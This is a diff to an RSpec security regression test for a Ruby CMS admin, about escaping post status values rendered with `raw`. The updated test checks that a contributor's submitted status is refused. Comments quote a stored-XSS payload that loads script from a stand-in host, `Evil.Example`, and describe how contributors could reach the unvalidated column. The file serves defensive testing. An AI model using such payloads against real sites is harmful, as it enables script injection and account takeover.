@@ -4,8 +4,9 @@
 # raw column value for anything else, building its markup by string interpolation. Three admin views
 # render the result through `raw`, so a status that is not canonical is emitted as live markup.
 #
-# `posts.status` is writable at contributor privilege -- `get_post_data` permits `:status`, the model
-# has no `inclusion:` validation, and the only guard rewrites the exact literal 'published'.
+# A submitted `post[status]` is now held to the statuses the editor offers, but the column is still
+# written without model validation by `trash`, `restore` and the drafts save, and a value stored before
+# that rule stays; rendering code therefore never trusts the column.
 #
 # `titleize` is not a mitigation: HTML tag and attribute names are case-insensitive and so are DNS
 # hostnames, so the titleized `<Script Src=//Evil.Example/A.Js>` loads and executes just the same.
@@ -73,8 +74,9 @@ RSpec.describe 'Security: post status output escaping', type: :request do
     end
   end
 
-  # The source. A role holding only `edit` on the post type gets `:create_post` but not
-  # `:publish_post`, which is the lowest privilege that can create content at all.
+  # The former source. A role holding only `edit` on the post type gets `:create_post` but not
+  # `:publish_post`, which is the lowest privilege that can create content at all; its submitted
+  # status is refused before anything is written.
   describe 'reaching the column at contributor privilege' do
     let(:contributor_role) { current_site.user_roles.find_by!(slug: 'contributor') }
     let(:contributor) { create(:user, role: contributor_role.slug, site: current_site) }
@@ -84,13 +86,14 @@ RSpec.describe 'Security: post status output escaping', type: :request do
       sign_in_as(contributor, site: current_site)
     end
 
-    it 'stores the submitted status verbatim' do
+    it 'refuses the submitted status and creates nothing' do
       post "/admin/post_type/#{post_type.id}/posts", params: {
         post: { title: 'Contributor post', slug: 'contributor-post', content: 'x', status: payload }
       }
 
-      expect(response).to have_http_status(:found)
-      expect(post_type.posts.find_by(slug: 'contributor-post').status).to eq(payload)
+      expect(response).to have_http_status(:ok)
+      expect(response.body).to include('post[status]')
+      expect(post_type.posts.find_by(slug: 'contributor-post')).to be_nil
     end
   end
 end
